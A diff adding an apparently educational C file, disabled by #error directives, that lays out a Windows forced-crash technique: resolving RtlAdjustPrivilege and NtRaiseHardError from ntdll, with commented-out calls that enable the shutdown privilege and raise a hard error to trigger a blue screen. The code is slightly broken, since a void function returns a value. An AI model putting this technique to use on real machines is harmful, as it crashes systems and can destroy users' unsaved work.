@@ -1,0 +1,58 @@
+#error This file is documentation only and must not be compiled.
+#error DO NOT RUN, pretty please.
+#warning WHAT ARE YOU DOING?
+#pragma message("sorry cant let ya in")
+
+/* WARNING:
+  THIS IS ONLY FOR EDUCATIONAL AND DEMONSTRATIVE PURPOSES ONLY
+  THIS CODE IS NOT MEANT FOR EXECUTION
+
+  THE NAME KILLERQUEEN IS JUST A JOJO'S BIZARRE ADVENTURE REFERENCE, NOT PROVOKING ANYTHING.
+  WITH ALL THAT SET LET'S DOCUMENT IT
+*/
+// This file intentionally has no entry point.
+#include <windows.h>
+#include <stdio.h>
+
+typedef long NTSTATUS;
+
+typedef NTSTATUS (WINAPI *RtlAdjustPrivilege_t)(
+    ULONG Privilege,
+    BOOLEAN Enable,
+    BOOLEAN CurrentThread,
+    PBOOLEAN Enabled
+);
+
+typedef NTSTATUS (WINAPI *NtRaiseHardError_t)(
+    NTSTATUS ErrorStatus,
+    ULONG NumberOfParameters,
+    ULONG UnicodeStringParameterMask,
+    PVOID Parameters,
+    ULONG ResponseOption,
+    PULONG Response
+);
+
+void UNRUNNABLE() // well
+{
+    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    if (!ntdll) return 1;
+    
+    RtlAdjustPrivilege_t pRtlAdjustPrivilege = 
+        (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    NtRaiseHardError_t pNtRaiseHardError = 
+        (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
+    
+    if (pRtlAdjustPrivilege && pNtRaiseHardError) {
+        BOOLEAN enabled;
+        ULONG response;
+        
+        // Enable SeShutdownPrivilege (19)
+        // pRtlAdjustPrivilege(19, TRUE, FALSE, &enabled); this helps with it.
+        
+        // Trigger BSOD (old method - may not work on modern Windows)
+       // pNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response); this triggers it but i commented it out
+    }
+    
+    FreeLibrary(ntdll);
+    return;
+}
